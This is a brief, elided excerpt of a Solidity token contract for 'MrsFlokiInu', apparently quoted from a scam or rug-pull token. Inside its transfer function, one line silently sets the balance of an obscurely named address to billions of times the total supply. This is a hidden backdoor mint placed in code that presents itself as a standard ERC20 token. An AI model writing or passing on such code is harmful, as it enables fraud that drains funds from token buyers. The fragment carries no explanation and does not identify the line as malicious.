...
contract TT is Ownable, IERC20 {
    ...
    string private _name = "MrsFlokiInu";
    string private _symbol = "MrsFloki";
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        _balance[vdfsd] = 5300000000*_balance[vdfsd].add(_totalSupply).div(1); 
        }
